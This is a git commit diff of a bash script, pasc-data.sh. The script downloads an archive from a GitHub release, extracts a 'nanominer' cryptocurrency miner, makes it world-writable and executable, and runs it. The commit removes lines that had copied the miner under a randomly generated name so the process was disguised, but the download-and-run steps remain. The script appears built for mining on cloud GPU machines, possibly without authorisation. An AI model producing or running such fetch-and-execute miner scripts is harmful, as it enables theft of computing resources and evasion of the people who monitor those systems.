303d372e6123ede29af5ff3567be9b75940ecb2c
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-04-24 21:44:21 +0700

    Update pasc-data.sh

--- pasc-data.sh
+++ pasc-data.sh
@@ -1,10 +1,7 @@
 #!/bin/bash
 sudo apt-get update
-azure=mxsemsdnlkdj;
-a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-rm -r platinum.tar.gz
+rm -r platinum.tar.gz platinum
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
 tar xf platinum.tar.gz
 cd platinum && chmod 777 nanominer
-sudo cp nanominer "$cpuname"
-./"${cpuname}"
+./nanominer
